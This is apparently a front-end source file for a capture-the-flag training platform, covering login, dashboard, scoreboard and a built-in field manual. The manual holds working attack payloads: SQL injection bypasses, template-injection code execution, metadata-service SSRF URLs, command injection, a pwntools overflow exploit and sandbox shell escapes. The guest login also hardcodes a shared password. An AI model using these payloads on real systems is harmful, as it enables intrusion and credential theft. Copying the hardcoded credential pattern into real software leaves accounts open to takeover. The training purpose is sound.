      toast(`🎉 Case Cleared: ${{challenge.name}} (+${{result.points_awarded || challenge.points}} PTS)`, 'success');
      await Promise.all([loadScoreboard(), loadMyProfile(), loadMySubmissions(), loadChallenges()]);
      if (state.view === 'challenges') renderChallengesView();
    }} else {{
      btn.disabled = false;
      btn.textContent = 'Submit Flag';
      await loadMySubmissions();
    }}
  }} catch (err) {{
    resultEl.className = 'submit-result show incorrect';
    resultEl.textContent = err.message;
    btn.disabled = false;
    btn.textContent = 'Submit Flag';
  }}
}}

// ---------------------------------------------------------------------------
// Countdown Timer
// ---------------------------------------------------------------------------

function startCountdown(expiresAtIso) {{
  stopCountdown();
  const noteEl = () => document.getElementById('expiry-note');
  const tick = () => {{
    const el = noteEl();
    if (!el) {{ stopCountdown(); return; }}
    const remainingMs = new Date(expiresAtIso).getTime() - Date.now();
    if (remainingMs <= 0) {{
      el.textContent = 'This instance has expired. Please spawn a fresh one.';
      el.classList.add('warn');
      stopCountdown();
      return;
    }}
    const mins = Math.floor(remainingMs / 60000);
    const secs = Math.floor((remainingMs % 60000) / 1000);
    el.textContent = `Instance active: ${{mins}}m ${{secs.toString().padStart(2, '0')}}s remaining`;
    el.classList.toggle('warn', remainingMs < 5 * 60000);
  }};
  tick();
  state.countdownTimer = setInterval(tick, 1000);
}}

function stopCountdown() {{
  if (state.countdownTimer) {{
    clearInterval(state.countdownTimer);
    state.countdownTimer = null;
  }}
}}

function formatRelativeExpiry(iso) {{
  const ms = new Date(iso).getTime() - Date.now();
  if (ms <= 0) return 'now';
  const mins = Math.round(ms / 60000);
  if (mins < 60) return `in ${{mins}}m`;
  return `in ${{Math.round(mins / 60)}}h`;
}}

// ---------------------------------------------------------------------------
// Auth Modal (Sign In / Register / Guest)
// ---------------------------------------------------------------------------

function openAuthModal(tab = 'login') {{
  state.authModalTab = tab;
  const modalRoot = document.getElementById('modal-root');
  modalRoot.innerHTML = `
    <div class="modal-backdrop" id="auth-backdrop">
      <div class="modal auth-modal-card" role="dialog" aria-modal="true">
        <button class="modal-close" id="auth-modal-close">&times;</button>
        <div class="auth-brand"><span class="dot"></span> RESTRICTED CLEARANCE TERMINAL</div>
        <div class="auth-title">INTERSECT</div>
        <p class="auth-sub">Authenticate to record verified solves on the live scoreboard and manage long-running machine instances.</p>

        <div class="auth-tabs">
          <button class="auth-tab ${{tab === 'login' ? 'active' : ''}}" data-tab="login">Sign In</button>
          <button class="auth-tab ${{tab === 'register' ? 'active' : ''}}" data-tab="register">Request Clearance</button>
        </div>

        <div id="auth-modal-form-area"></div>
      </div>
    </div>
  `;

  document.getElementById('auth-modal-close').addEventListener('click', closeAuthModal);
  document.getElementById('auth-backdrop').addEventListener('click', (e) => {{
    if (e.target.id === 'auth-backdrop') closeAuthModal();
  }});

  document.querySelectorAll('.auth-tab').forEach(btn => {{
    btn.addEventListener('click', () => openAuthModal(btn.dataset.tab));
  }});

  const area = document.getElementById('auth-modal-form-area');
  area.innerHTML = tab === 'login' ? loginFormHtml() : registerFormHtml();

  if (tab === 'login') {{
    document.getElementById('login-form').addEventListener('submit', onLoginSubmit);
    const guestBtn = document.getElementById('quick-guest-btn');
    if (guestBtn) guestBtn.addEventListener('click', onGuestLoginModal);
  }} else {{
    document.getElementById('register-form').addEventListener('submit', onRegisterSubmit);
  }}
}}

function closeAuthModal() {{
  document.getElementById('modal-root').innerHTML = '';
}}

function loginFormHtml() {{
  return `
    <form id="login-form">
      <div class="field">
        <label for="login-username">Callsign (Username)</label>
        <input id="login-username" name="username" placeholder="e.g. Agent01" autocomplete="username" required>
      </div>
      <div class="field">
        <label for="login-password">Passphrase (Password)</label>
        <input id="login-password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required>
      </div>
      <div id="login-error" class="field-error" style="display:none"></div>
      <button type="submit" class="btn btn-primary btn-block">Authenticate</button>
      <div style="margin-top:12px; text-align:center;">
        <button type="button" id="quick-guest-btn" class="btn btn-ghost btn-sm" style="width:100%; border:1px dashed var(--hairline-bright)">
          ⚡ Instant Guest Clearance (1-Click)
        </button>
      </div>
    </form>
  `;
}}

function registerFormHtml() {{
  return `
    <form id="register-form">
      <div class="field">
        <label for="reg-username">Choose a Callsign</label>
        <input id="reg-username" name="username" placeholder="e.g. CipherBreaker" autocomplete="username" required>
      </div>
      <div class="field">
        <label for="reg-email">Official Email</label>
        <input id="reg-email" name="email" type="email" placeholder="agent@agency.org" autocomplete="email" required>
      </div>
      <div class="field">
        <label for="reg-password">Security Passphrase</label>
        <input id="reg-password" name="password" type="password" placeholder="Min. 8 characters" autocomplete="new-password" minlength="8" required>
      </div>
      <div id="register-error" class="field-error" style="display:none"></div>
      <button type="submit" class="btn btn-primary btn-block">Create Clearance</button>
    </form>
  `;
}}

async function onLoginSubmit(e) {{
  e.preventDefault();
  const form = e.target;
  const submitBtn = form.querySelector('button[type=submit]');
  const errorEl = document.getElementById('login-error');
  errorEl.style.display = 'none';

  const username = form.username.value.trim();
  const password = form.password.value;

  submitBtn.disabled = true;
  submitBtn.textContent = 'Authenticating…';
  try {{
    const data = await api.login(username, password);
    persistSession(data.access_token, username, null);
    closeAuthModal();
    toast(`Welcome back, Operative ${{username}}.`, 'success');
    await bootApp();
  }} catch (err) {{
    errorEl.textContent = err.message || 'Sign in failed.';
    errorEl.style.display = 'block';
  }} finally {{
    submitBtn.disabled = false;
    submitBtn.textContent = 'Authenticate';
  }}
}}

async function onGuestLoginModal() {{
  const guestBtn = document.getElementById('quick-guest-btn');
  if (guestBtn) {{
    guestBtn.disabled = true;
    guestBtn.textContent = 'Generating clearance…';
  }}
  const guestUser = 'Agent_' + Math.floor(1000 + Math.random() * 9000);
  const guestEmail = `${{guestUser.toLowerCase()}}@intersect.local`;
  const guestPass = 'GuestPass123!';
  try {{
    try {{
      await api.register(guestUser, guestEmail, guestPass);
    }} catch {{}}
    const data = await api.login(guestUser, guestPass);
    persistSession(data.access_token, guestUser, guestEmail);
    closeAuthModal();
    toast(`Clearance granted: ${{guestUser}}`, 'success');
    await bootApp();
  }} catch (err) {{
    toast(err.message || 'Guest clearance failed.', 'error');
    if (guestBtn) {{
      guestBtn.disabled = false;
      guestBtn.textContent = '⚡ Instant Guest Clearance (1-Click)';
    }}
  }}
}}

async function onRegisterSubmit(e) {{
  e.preventDefault();
  const form = e.target;
  const submitBtn = form.querySelector('button[type=submit]');
  const errorEl = document.getElementById('register-error');
  errorEl.style.display = 'none';

  const username = form.username.value.trim();
  const email = form.email.value.trim();
  const password = form.password.value;

  submitBtn.disabled = true;
  submitBtn.textContent = 'Creating clearance…';
  try {{
    await api.register(username, email, password);
    const data = await api.login(username, password);
    persistSession(data.access_token, username, email);
    closeAuthModal();
    toast('Clearance granted. Welcome to Intersect Range.', 'success');
    await bootApp();
  }} catch (err) {{
    errorEl.textContent = err.message || 'Registration failed.';
    errorEl.style.display = 'block';
  }} finally {{
    submitBtn.disabled = false;
    submitBtn.textContent = 'Create Clearance';
  }}
}}

// ---------------------------------------------------------------------------
// Render: Mission Hub / Dashboard
// ---------------------------------------------------------------------------

function renderDashboardView() {{
  const content = document.getElementById('content');
  const allChallenges = state.challenges || EMBEDDED_CHALLENGES;
  const myEntry = (state.scoreboard || []).find(e => e.username === state.username);
  const rank = myEntry ? (state.scoreboard.indexOf(myEntry) + 1) : null;
  const solvedCount = myEntry ? myEntry.solves : getSolvedSet().size;
  const score = myEntry ? myEntry.score : 0;
  const liveInstances = state.myInstances.filter(i => i.status === 'running');

  content.innerHTML = `
    <div class="page-head">
      <h1>Mission Operations Hub</h1>
      <p>Overview of active target machines, solve progress across all 7 vulnerability domains, and leaderboard standings.</p>
    </div>

    <div class="stat-grid">
      <div class="stat-card">
        <div class="label">Total Score</div>
        <div class="value accent">${{score}} PTS</div>
        <div class="sub">across ${{solvedCount}} cleared case file${{solvedCount === 1 ? '' : 's'}}</div>
      </div>
      <div class="stat-card">
        <div class="label">Rank Standing</div>
        <div class="value">${{rank ? '#' + rank : (state.isGuest ? 'Guest' : 'Unranked')}}</div>
        <div class="sub">${{(state.scoreboard || []).length}} registered operatives</div>
      </div>
      <div class="stat-card">
        <div class="label">Active Machines</div>
        <div class="value">${{liveInstances.length}}</div>
        <div class="sub">sandboxes running</div>
      </div>
      <div class="stat-card">
        <div class="label">100 CTF Range Catalog</div>
        <div class="value">${{allChallenges.length}}</div>
        <div class="sub">across 7 categories</div>
      </div>
    </div>

    <div class="panel-block">
      <h3>Live Target Machines</h3>
      <div id="dash-instances"></div>
    </div>

    <div class="panel-block">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
        <h3>Featured CTF Problem Collections</h3>
        <a href="#" id="dash-browse-link" class="mono" style="font-size:12px; color:var(--amber);">Browse All 100 Problems →</a>
      </div>
      <div class="case-grid" id="dash-recent-cases"></div>
    </div>
  `;

  document.getElementById('dash-browse-link').addEventListener('click', (e) => {{
    e.preventDefault();
    navigate('challenges');
  }});

  renderInstanceList(document.getElementById('dash-instances'));

  const recentHost = document.getElementById('dash-recent-cases');
  const preview = allChallenges.slice(0, 6);
  recentHost.innerHTML = preview.map(caseCardHtml).join('');
  attachCaseCardHandlers(recentHost);
}}

function renderInstanceList(host) {{
  const live = state.myInstances.filter(i => i.status === 'running');
  if (live.length === 0) {{
    host.innerHTML = emptyStateHtml('No running target sandboxes.', 'Launch a machine from any of the 100 challenges to begin exploitation.');
    return;
  }}
  host.innerHTML = live.map(inst => {{
    const challenge = (state.challenges || EMBEDDED_CHALLENGES).find(c => c.id === inst.challenge_id);
    const targetHost = inst.connect_info || `localhost:${{inst.host_port}}`;
    const webUrl = targetHost.startsWith('http') ? targetHost : `http://${{targetHost}}`;
    return `
      <div class="instance-row">
        <div>
          <div class="name">${{escapeHtml(challenge ? challenge.name : 'Unknown Challenge')}}</div>
          <div class="meta mono">${{escapeHtml(targetHost)}} · expires ${{formatRelativeExpiry(inst.expires_at)}}</div>
        </div>
        <div style="display:flex; gap:8px;">
          <a href="${{webUrl}}" target="_blank" rel="noopener noreferrer" class="btn btn-primary btn-sm" style="text-decoration:none;">Launch ↗</a>
          <button class="btn btn-danger btn-sm" data-stop-instance="${{inst.id}}">Stop</button>
        </div>
      </div>
    `;
  }}).join('');
  host.querySelectorAll('[data-stop-instance]').forEach(btn => {{
    btn.addEventListener('click', () => stopInstanceFromList(btn.dataset.stopInstance));
  }});
}}

async function stopInstanceFromList(instanceId) {{
  try {{
    await api.stopInstance(instanceId);
    toast('Target machine stopped.', 'info');
    await loadMyInstances();
    renderContent();
  }} catch (err) {{
    toast(err.message, 'error');
  }}
}}

function emptyStateHtml(title, sub) {{
  return `
    <div class="empty-state">
      <div class="glyph">// archive</div>
      <p><strong style="color:var(--paper)">${{escapeHtml(title)}}</strong><br>${{escapeHtml(sub)}}</p>
    </div>
  `;
}}

// ---------------------------------------------------------------------------
// Documentation / Field Manual
// ---------------------------------------------------------------------------

const DOCS_DATA = [
  {{
    id: 'ctf101',
    title: 'CTF 101 & Platform Operations',
    tag: 'OPERATIONS',
    summary: 'Essential rules, flag format, machine orchestration lifecycle, and dynamic decaying scoring mechanics.',
    content: `
      <h2>1. Flag Format & Capture Protocol</h2>
      <p>All flags across the platform follow the standardized regular expression format:</p>
      <div class="code-box">
        <code>CTF{{unique_investigator_token_and_secret_proof}}</code>
      </div>
      <p>Every problem instance creates an isolated runtime environment with a <strong>unique flag generated specifically for your session</strong>. Sharing flags with other players will fail submission checks.</p>

      <h2>2. Machine Lifecycle & TTL</h2>
      <ul>
        <li><strong>Instance Allocation:</strong> Clicking <em>Start machine</em> spins up an isolated sandbox.</li>
        <li><strong>Direct Access:</strong> Use the <strong>Launch ↗</strong> button to open the target challenge web portal.</li>
        <li><strong>Countdown Timer:</strong> Instances carry a 45-minute Time-To-Live (TTL). You can stop and restart a machine at any time.</li>
      </ul>

      <h2>3. Dynamic Score Decay Algorithm</h2>
      <p>Points decay dynamically as more investigators solve a case. First blood and early solves award the highest bounty:</p>
      <div class="code-box">
        <code>Points(solves) = Math.round(BasePoints × (0.30 + 0.70 × (0.95 ^ solves)))</code>
      </div>
    `,
    relatedCategory: 'all'
  }},
  {{
    id: 'web',
    title: 'Web Exploitation Field Manual',
    tag: 'WEB',
    summary: 'SQLi, XSS, SSTI, SSRF, Command Injection, JWT Attacks, Path Traversal, and Insecure Deserialization.',
    content: `
      <h2>1. SQL Injection (SQLi)</h2>
      <p>Exploit unparameterized database queries to bypass auth or dump tables:</p>
      <div class="code-box">
        <div>// Authentication Bypass Payloads</div>
        <code>' OR 1=1 --</code><br>
        <code>admin' --</code><br>
        <code>' OR '1'='1</code><br><br>
        <div>// SQLite / MySQL Schema Discovery</div>
        <code>' UNION SELECT 1, tbl_name, sql FROM sqlite_master --</code><br>
        <code>' UNION SELECT null, username, password FROM users --</code>
      </div>

      <h2>2. Server-Side Template Injection (SSTI)</h2>
      <p>Targeting Jinja2 / Python template engines to gain arbitrary Remote Code Execution (RCE):</p>
      <div class="code-box">
        <code>{{{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat /flag*').read() }}}}</code><br>
        <code>{{{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}}}</code>
      </div>

      <h2>3. Server-Side Request Forgery (SSRF)</h2>
      <p>Pivot through internal HTTP gateways to query private cloud metadata APIs:</p>
      <div class="code-box">
        <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br>
        <code>http://127.0.0.1:8000/api/v2/internal/keys</code><br>
        <code>http://0.0.0.0:5000/</code>
      </div>

      <h2>4. Command Injection & Shell Evasion</h2>
      <p>Chain shell execution commands past basic input filters:</p>
      <div class="code-box">
        <code>127.0.0.1; cat /flag</code><br>
        <code>127.0.0.1 | env</code><br>
        <code>127.0.0.1 && $(cat$IFS/flag)</code>
      </div>

      <h2>5. JWT Signature Bypass (alg: none)</h2>
      <p>Modify the JWT header to disable cryptographic verification:</p>
      <div class="code-box">
        <code>{{"alg": "none", "typ": "JWT"}}</code>
      </div>
    `,
    relatedCategory: 'web'
  }},
  {{
    id: 'crypto',
    title: 'Cryptography & Cryptanalysis Handbook',
    tag: 'CRYPTO',
    summary: 'XOR frequency analysis, RSA low-exponent & Wiener attacks, AES ECB/CBC bit-flipping, and padding oracles.',
    content: `
      <h2>1. Single-Byte & Repeating XOR</h2>
      <p>XOR cipher properties: if <code>C = P ⊕ K</code>, then <code>P = C ⊕ K</code> and <code>K = C ⊕ P</code>.</p>
      <div class="code-box">
        <div># Python single-byte brute force snippet</div>
        <code>def brute_xor(ct):<br>
  &nbsp;&nbsp;return [bytes([b ^ k for b in ct]) for k in range(256)]</code>
      </div>

      <h2>2. RSA Low Public Exponent (e = 3)</h2>
      <p>When <code>e = 3</code> and message <code>m</code> is small such that <code>m³ &lt; N</code>, no modulus wrap occurs:</p>
      <div class="code-box">
        <code>import gmpy2<br>m, exact = gmpy2.iroot(ciphertext, 3)<br>print(bytes.fromhex(hex(m)[2:]))</code>
      </div>

      <h2>3. Wiener's Continued Fraction Attack</h2>
      <p>Applicable when the private exponent <code>d &lt; (1/3) × N^(1/4)</code>. Use continued fractions expansion of <code>e/N</code> to recover <code>d</code> and factor <code>N</code>.</p>

      <h2>4. AES-CBC Bit-Flipping Attack</h2>
      <p>Modifying byte <code>k</code> in ciphertext block <code>C_{{i-1}}</code> flips the corresponding bit in plaintext block <code>P_i</code>:</p>
      <div class="code-box">
        <code>C_mod[k] = C_orig[k] ^ P_target[k] ^ P_desired[k]</code>
      </div>

      <h2>5. CBC Padding Oracle</h2>
      <p>Decrypt ciphertext block-by-block without the key by observing server responses to invalid PKCS#7 padding.</p>
    `,
    relatedCategory: 'crypto'
  }},
  {{
    id: 'rev',
    title: 'Reverse Engineering & Disassembly Guide',
    tag: 'REV',
    summary: 'Ghidra & IDA workflow, Assembly calling conventions, Z3 constraint solver, Wasm, and bytecode reversing.',
    content: `
      <h2>1. Ghidra & IDA Pro Workflow</h2>
      <ul>
        <li><strong>Imports & Exports:</strong> Check external API imports (e.g. <code>ptrace</code>, <code>strcmp</code>, <code>CryptDecrypt</code>).</li>
        <li><strong>String References:</strong> Search strings view (<code>Shift + F12</code> in IDA, Window → Defined Strings in Ghidra).</li>
        <li><strong>Decompiler:</strong> Press <code>F5</code> / <code>Tab</code> to generate high-level C pseudocode.</li>
      </ul>

      <h2>2. x86_64 System V Calling Convention</h2>
      <div class="code-box">
        <code>Arguments passed in: RDI, RSI, RDX, RCX, R8, R9<br>
Return value stored in: RAX</code>
      </div>

      <h2>3. Z3 Constraint Solver Keygen Script</h2>
      <p>Automate cracking complex mathematical validation loops with Z3:</p>
      <div class="code-box">
        <code>from z3 import *<br>
s = Solver()<br>
chars = [BitVec(f'c_{{i}}', 8) for i in range(16)]<br>
for c in chars: s.add(c >= 32, c <= 126)<br>
s.add(chars[0] ^ chars[1] == 0x42)<br>
if s.check() == sat:<br>
&nbsp;&nbsp;m = s.model()<br>
&nbsp;&nbsp;print(''.join([chr(m[c].as_long()) for c in chars]))</code>
      </div>

      <h2>4. WebAssembly (.wasm) Disassembly</h2>
      <p>Convert Wasm bytecode to readable WebAssembly Text format using WABT:</p>
      <div class="code-box">
        <code>wasm2wat auth.wasm -o auth.wat</code>
      </div>
    `,
    relatedCategory: 'rev'
  }},
  {{
    id: 'forensics',
    title: 'Forensics & Incident Response Toolkit',
    tag: 'FORENSICS',
    summary: 'Wireshark filters, Volatility 3 memory analysis, Steganography, Audio spectrograms, and file carving.',
    content: `
      <h2>1. Wireshark & Tshark Packet Filters</h2>
      <div class="code-box">
        <code>// Display unencrypted POST data & logins<br>
http.request.method == "POST"<br><br>
// Isolate DNS exfiltration tunneling queries<br>
dns.flags.response == 0 && dns.qry.name matches ".*\\\\.tunnel\\\\..*"<br><br>
// Follow raw TCP communication stream<br>
tcp.stream eq 4</code>
      </div>

      <h2>2. Volatility 3 Memory Forensics</h2>
      <div class="code-box">
        <code># List active process tree<br>
python vol.py -f memory.raw windows.pstree<br><br>
# Scan for injected shellcode & hidden DLLs<br>
python vol.py -f memory.raw windows.malfind<br><br>
# Extract process memory dump<br>
python vol.py -f memory.raw windows.dumpfiles --pid 1337</code>
      </div>

      <h2>3. Steganography & Visual Analysis</h2>
      <ul>
        <li><strong>PNG / BMP LSB Analysis:</strong> <code>zsteg -a evidence.png</code></li>
        <li><strong>Hidden File Carving:</strong> <code>binwalk -e firmware.bin</code></li>
        <li><strong>Audio Spectrogram:</strong> Open in Sonic Visualiser / Audacity and toggle Spectrogram View.</li>
      </ul>
    `,
    relatedCategory: 'forensics'
  }},
  {{
    id: 'pwn',
    title: 'Binary Exploitation (Pwn) Methodology',
    tag: 'PWN',
    summary: 'Stack Buffer Overflows, Format String Exploits, Ret2libc, Shellcoding, and ROP Chain generation.',
    content: `
      <h2>1. Stack Buffer Overflow (Ret2Win)</h2>
      <p>1. Find crash offset using cyclic patterns:</p>
      <div class="code-box">
        <code>cyclic 100<br>
# In GDB: look up saved RIP register value<br>
cyclic -l 0x6161616c  # Output: offset = 40</code>
      </div>
      <p>2. Construct Pwntools exploit payload:</p>
      <div class="code-box">
        <code>from pwn import *<br>
p = remote('127.0.0.1', 5000)<br>
win_addr = 0x4011d6<br>
payload = b"A" * 40 + p64(win_addr)<br>
p.sendline(payload)<br>
p.interactive()</code>
      </div>

      <h2>2. Format String Memory Leaks</h2>
      <p>When user input is passed directly to <code>printf(input)</code>:</p>
      <div class="code-box">
        <code>// Leak stack pointer and string contents<br>
%x.%x.%x.%x<br>
%12$p  // Read 12th argument directly<br>
%12$s  // Dereference pointer at 12th argument as string</code>
      </div>

      <h2>3. ROP (Return-Oriented Programming)</h2>
      <p>Locate gadgets to set up arguments for <code>system('/bin/sh')</code>:</p>
      <div class="code-box">
        <code>ROPgadget --binary ./vuln | grep "pop rdi ; ret"</code>
      </div>
    `,
    relatedCategory: 'pwn'
  }},
  {{
    id: 'misc',
    title: 'Sandbox Escapes & PyJail Breakout Guide',
    tag: 'MISC',
    summary: 'Python Jailbreak MRO subclass traversal, restricted bash (rbash) breakouts, and SUID privesc.',
    content: `
      <h2>1. Python Jailbreak (PyJail) Subclasses</h2>
      <p>Traverse the object hierarchy to locate loaded modules when <code>import</code> and <code>builtins</code> are blocked:</p>
      <div class="code-box">
        <code># Crawl object subclasses to find os / popen<br>
()._class__.__base__.__subclasses__()[137].__init__.__globals__['system']('sh')<br><br>
# BuiltinImporter execution<br>
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0]().load_module('os').system('sh')</code>
      </div>

      <h2>2. Restricted Bash (rbash) Escape</h2>
      <div class="code-box">
        <code># Via vi / vim<br>
:set shell=/bin/sh<br>
:shell<br><br>
# Via awk<br>
awk 'BEGIN {{system("/bin/sh")}}'<br><br>
# Via find<br>
find / -exec /bin/sh -p \\; -quit</code>
      </div>

      <h2>3. SUID Binary Privilege Escalation</h2>
      <p>Search for binaries with SUID bit set on the system:</p>
      <div class="code-box">
        <code>find / -perm -u=s -type f 2>/dev/null</code>
      </div>
    `,
    relatedCategory: 'misc'
  }},
  {{
    id: 'tools',
    title: 'CTF Arsenal & Essential Tools Directory',
    tag: 'ARSENAL',
    summary: 'Curated list of industry-standard security tools, decompilers, solvers, and cheat sheets.',
    content: `
      <h2>1. Web Exploitation Arsenal</h2>
      <ul>
        <li><strong>Burp Suite:</strong> Intercepting web proxy, Repeater, Intruder.</li>
        <li><strong>CyberChef:</strong> The Swiss Army knife for decoding, unescaping, and hash identification.</li>
        <li><strong>sqlmap:</strong> Automated SQL injection and database takeover engine.</li>
        <li><strong>ffuf / Gobuster:</strong> High-speed web fuzzer and directory discovery.</li>
      </ul>

      <h2>2. Cryptography & Password Cracking</h2>
      <ul>
        <li><strong>RsaCtfTool:</strong> Automated RSA attacks and private key recovery.</li>
        <li><strong>Hashcat:</strong> World's fastest GPU password & token recovery.</li>
        <li><strong>John the Ripper:</strong> Multi-format password cracker.</li>
        <li><strong>SageMath:</strong> Advanced mathematical cryptanalysis framework.</li>
      </ul>

      <h2>3. Reverse Engineering & Binary Tools</h2>
      <ul>
        <li><strong>Ghidra (NSA):</strong> Open-source SRE framework and multi-architecture decompiler.</li>
        <li><strong>GDB + GEF / Pwndbg:</strong> Enhanced GNU Debugger for exploit development.</li>
        <li><strong>pwntools:</strong> Python CTF framework for crafting binary exploits.</li>
        <li><strong>dnSpy / ILSpy:</strong> .NET binary decompiler and debugger.</li>
      </ul>
    `,
    relatedCategory: 'all'
  }}
];

function renderDocsView() {{
  const content = document.getElementById('content');
  const activeTopicId = state.activeDocTopic || 'ctf101';
  const activeDoc = DOCS_DATA.find(d => d.id === activeTopicId) || DOCS_DATA[0];

  const q = (state.docSearch || '').trim().toLowerCase();
  const filteredDocs = DOCS_DATA.filter(d => {{
    if (!q) return true;
    return d.title.toLowerCase().includes(q) || d.summary.toLowerCase().includes(q) || d.content.toLowerCase().includes(q);
  }});

  const sidebarLinks = filteredDocs.map(d => {{
    const isActive = d.id === activeDoc.id;
    return `
      <button class="doc-nav-item ${{isActive ? 'active' : ''}}" data-doc-id="${{d.id}}">
        <span class="tag-pill">${{d.tag}}</span>
        <div class="title">${{escapeHtml(d.title)}}</div>
        <div class="summary">${{escapeHtml(d.summary)}}</div>
      </button>
    `;
  }}).join('');

  content.innerHTML = `
    <div class="page-head">
      <h1>CTF Field Manual // Documentation Hub</h1>
      <p>Operational cheatsheets, attack matrices, payloads, and cryptanalysis formulas to solve all 100 challenges.</p>
    </div>

    <div class="docs-layout">
      <div class="docs-sidebar">
        <div class="docs-search-box">
          <span class="icon">${{ICON.search}}</span>
          <input id="docs-search-input" placeholder="Search guides & payloads…" value="${{escapeHtml(state.docSearch || '')}}">
        </div>
        <div class="docs-nav-list" id="docs-nav-list">
          ${{sidebarLinks || '<div style="padding:14px;color:var(--paper-faint);font-size:12px;">No documentation matches found.</div>'}}
        </div>
      </div>

      <div class="docs-content">
        <div class="docs-article">
          <div class="article-header">
            <span class="tag-pill">${{activeDoc.tag}}</span>
            <h2>${{escapeHtml(activeDoc.title)}}</h2>
            <p>${{escapeHtml(activeDoc.summary)}}</p>
          </div>
          <div class="divider"></div>
          <div class="article-body">
            ${{activeDoc.content}}
          </div>
          <div class="divider"></div>
          <div class="article-footer">
            <button class="btn btn-primary" id="docs-explore-chals-btn">Browse ${{activeDoc.tag}} Challenges →</button>
          </div>
        </div>
      </div>
    </div>
  `;

  document.querySelectorAll('.doc-nav-item').forEach(btn => {{
    btn.addEventListener('click', () => {{
      state.activeDocTopic = btn.dataset.docId;
      renderDocsView();
    }});
  }});

  const searchInput = document.getElementById('docs-search-input');
  if (searchInput) {{
    searchInput.addEventListener('input', debounce((e) => {{
      state.docSearch = e.target.value;
      renderDocsView();
    }}, 200));
  }}

  const exploreBtn = document.getElementById('docs-explore-chals-btn');
  if (exploreBtn) {{
    exploreBtn.addEventListener('click', () => {{
      if (activeDoc.relatedCategory && activeDoc.relatedCategory !== 'all') {{
        state.filters.category = activeDoc.relatedCategory;
      }} else {{
        state.filters.category = 'all';
      }}
      navigate('challenges');
    }});
  }}
}}

// ---------------------------------------------------------------------------
// Scoreboard
// ---------------------------------------------------------------------------

function renderScoreboardView() {{
  const content = document.getElementById('content');
  content.innerHTML = `
    <div class="page-head">
      <h1>Range Leaderboard // Scoreboard</h1>
      <p>Real-time scores with dynamic decay calculation based on solve order.</p>
    </div>
    <div class="panel-block" style="padding:0; overflow:hidden">
      <table class="board-table" id="board-table"></table>
    </div>
  `;

  const table = document.getElementById('board-table');
  const board = state.scoreboard || [];

  if (board.length === 0) {{
    table.outerHTML = `<div class="panel-block">${{emptyStateHtml('No solved cases yet.', 'Be the first operative to clear a challenge!')}}</div>`;
    return;
  }}

  const rows = board.map((entry, i) => {{
    const rank = i + 1;
    const rankClass = rank === 1 ? 'top1' : rank === 2 ? 'top2' : rank === 3 ? 'top3' : '';
    const isMe = entry.username === state.username;
    return `
      <tr class="${{isMe ? 'me' : ''}}">
        <td class="rank-cell ${{rankClass}}">#${{rank}}</td>
        <td>${{escapeHtml(entry.username)}}${{isMe ? ' <span class="mono" style="color:var(--paper-faint);font-size:11px">(you)</span>' : ''}}</td>
        <td class="mono" style="color:var(--paper-dim)">${{entry.solves}} solve${{entry.solves === 1 ? '' : 's'}}</td>
        <td class="score-cell">${{entry.score}} PTS</td>
      </tr>
    `;
  }}).join('');

  table.innerHTML = `
    <thead>
      <tr>
        <th>Rank</th>
        <th>Operative Callsign</th>
        <th>Solves</th>
        <th style="text-align:right">Score</th>
      </tr>
    </thead>
    <tbody>${{rows}}</tbody>
  `;
}}

// ---------------------------------------------------------------------------
// Profile View
// ---------------------------------------------------------------------------

function renderProfileView() {{
  const content = document.getElementById('content');
  const myEntry = (state.scoreboard || []).find(e => e.username === state.username);
  const isGuest = !state.token;

  content.innerHTML = `
    <div class="page-head">
      <h1>Operative Dossier // Profile</h1>
      <p>${{isGuest ? 'Operating in guest clearance mode. Sign in to link your solves permanently.' : 'Official investigator record and submission log.'}}</p>
    </div>

    <div class="panel-block">
      <div class="profile-header">
        <div class="profile-avatar ${{isGuest ? 'guest' : ''}}">${{(state.username || 'GO').slice(0, 2).toUpperCase()}}</div>
        <div>
          <h2>${{escapeHtml(state.username || 'Guest Operative')}}</h2>
          <div class="email">${{escapeHtml(state.email || (isGuest ? 'temporary anonymous clearance' : 'registered user'))}}</div>
        </div>
      </div>
      <div class="stat-grid">
        <div class="stat-card">
          <div class="label">Total Score</div>
          <div class="value accent">${{myEntry ? myEntry.score : 0}} PTS</div>
        </div>
        <div class="stat-card">
          <div class="label">Cases Cleared</div>
          <div class="value">${{myEntry ? myEntry.solves : getSolvedSet().size}}</div>
        </div>
        <div class="stat-card">
          <div class="label">Leaderboard Rank</div>
          <div class="value">${{myEntry ? '#' + ((state.scoreboard || []).indexOf(myEntry) + 1) : (isGuest ? 'Guest' : '—')}}</div>
        </div>
      </div>
    </div>

    <div class="panel-block">
      <h3>Flag Submission Log</h3>
      <div id="profile-submissions"></div>
    </div>

    <div class="panel-block">
      <h3>Active Target Sandboxes</h3>
      <div id="profile-instances"></div>
    </div>

    <div class="panel-block">
      <h3>Clearance Session</h3>
      ${{isGuest ? `
        <p style="margin-bottom:14px">You are currently using an unlinked guest clearance. Sign in or register to secure your solves on the official leaderboard.</p>
        <button class="btn btn-primary" id="profile-auth-btn">${{ICON.bolt}} Sign In / Register</button>
      ` : `
        <p style="margin-bottom:14px">Signing out will end your authenticated session.</p>
        <button class="btn btn-danger" id="profile-logout-btn">Sign Out</button>
      `}}
    </div>
  `;

  renderSubmissionsTable(document.getElementById('profile-submissions'));
  renderInstanceList(document.getElementById('profile-instances'));

  if (document.getElementById('profile-auth-btn')) {{
    document.getElementById('profile-auth-btn').addEventListener('click', () => openAuthModal('login'));
  }}
  if (document.getElementById('profile-logout-btn')) {{
    document.getElementById('profile-logout-btn').addEventListener('click', logout);
  }}
}}

function renderSubmissionsTable(host) {{
  if (!host) return;
  const subs = state.submissions || [];
  if (subs.length === 0) {{
    host.innerHTML = emptyStateHtml('No flag submissions recorded.', 'Submit flags on challenge cases to track your trail.');
    return;
  }}

  const rows = subs.map(s => {{
    const timeStr = new Date(s.submitted_at).toLocaleString(undefined, {{
      month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
    }});
    const flagMask = s.submitted_flag.length > 24 ? s.submitted_flag.slice(0, 22) + '…' : s.submitted_flag;
    return `
      <tr>
        <td style="color:var(--paper-faint); font-size:12px">${{escapeHtml(timeStr)}}</td>
        <td><strong>${{escapeHtml(s.challenge_name || 'Case file')}}</strong></td>
